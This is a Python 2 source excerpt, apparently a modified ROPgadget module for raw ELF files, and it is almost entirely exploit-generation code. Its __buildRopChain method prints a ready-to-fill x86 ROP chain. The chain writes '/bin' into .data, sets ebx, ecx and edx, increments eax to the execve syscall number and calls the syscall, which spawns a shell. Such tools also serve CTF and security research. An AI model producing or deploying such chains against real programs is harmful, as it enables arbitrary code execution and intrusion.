...
##
## made some changes to support raw elf files by yuf4n.net
...
class ROPMakerX86_rawelf:
    ...
    def __buildRopChain(self, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall):
        ...
        if dataAddr == None:
            print "\n[-] Warning - Can't find a writable section. Use 0x0 to replace."
            dataAddr = 0x0
        ...
        print "\tbaseaddr = 0x0 # fill it"
        print "\tdata = 0x0 # fill it\n"
        
        print "\t# Padding goes here"
        print "\tp = ''\n"

        print "\tp += pack('<I', baseaddr + 0x%08x) # %s" %(popDst["vaddr"], popDst["gadget"])
        print "\tp += pack('<I', data + 0x%08x) # @ .data" %(dataAddr)
        self.__padding(popDst, {})

        print "\tp += pack('<I', baseaddr + 0x%08x) # %s" %(popSrc["vaddr"], popSrc["gadget"])
        print "\tp += '/bin'"
        self.__padding(popSrc, {popDst["gadget"].split()[1]: dataAddr}) # Don't overwrite reg dst

        print "\tp += pack('<I', baseaddr + 0x%08x) # %s" %(write4where["vaddr"], write4where["gadget"])
        self.__padding(write4where, {})

        print "\tp += pack('<I', baseaddr + 0x%08x) # %s" %(popDst["vaddr"], popDst["gadget"])
        print "\tp += pack('<I', data + 0x%08x) # @ .data + 4" %(dataAddr + 4)
        self.__padding(popDst, {})
        ...
        print "\tp += pack('<I', baseaddr + 0x%08x) # %s" %(popDst["vaddr"], popDst["gadget"])
        print "\tp += pack('<I', data + 0x%08x) # @ .data + 8" %(dataAddr + 8)
        self.__padding(popDst, {})

        print "\tp += pack('<I', baseaddr + 0x%08x) # %s" %(xorSrc["vaddr"], xorSrc["gadget"])
        self.__padding(xorSrc, {})

        print "\tp += pack('<I', baseaddr + 0x%08x) # %s" %(write4where["vaddr"], write4where["gadget"])
        self.__padding(write4where, {})

        print "\tp += pack('<I', baseaddr + 0x%08x) # %s" %(popEbx["vaddr"], popEbx["gadget"])
        print "\tp += pack('<I', data + 0x%08x) # @ .data" %(dataAddr)
        self.__padding(popEbx, {})

        print "\tp += pack('<I', baseaddr + 0x%08x) # %s" %(popEcx["vaddr"], popEcx["gadget"])
        print "\tp += pack('<I', data + 0x%08x) # @ .data + 8" %(dataAddr + 8)
        self.__padding(popEcx, {"ebx": dataAddr}) # Don't overwrite ebx

        print "\tp += pack('<I', baseaddr + 0x%08x) # %s" %(popEdx["vaddr"], popEdx["gadget"])
        print "\tp += pack('<I', data + 0x%08x) # @ .data + 8" %(dataAddr + 8)
        self.__padding(popEdx, {"ebx": dataAddr, "ecx": dataAddr + 8}) # Don't overwrite ebx and ecx

        print "\tp += pack('<I', baseaddr + 0x%08x) # %s" %(xorEax["vaddr"], xorEax["gadget"])
        self.__padding(xorEax, {"ebx": dataAddr, "ecx": dataAddr + 8}) # Don't overwrite ebx and ecx

        for i in range(11):
            print "\tp += pack('<I', baseaddr + 0x%08x) # %s" %(incEax["vaddr"], incEax["gadget"])
            self.__padding(incEax, {"ebx": dataAddr, "ecx": dataAddr + 8}) # Don't overwrite ebx and ecx

        print "\tp += pack('<I', baseaddr + 0x%08x) # %s" %(syscall["vaddr"], syscall["gadget"])
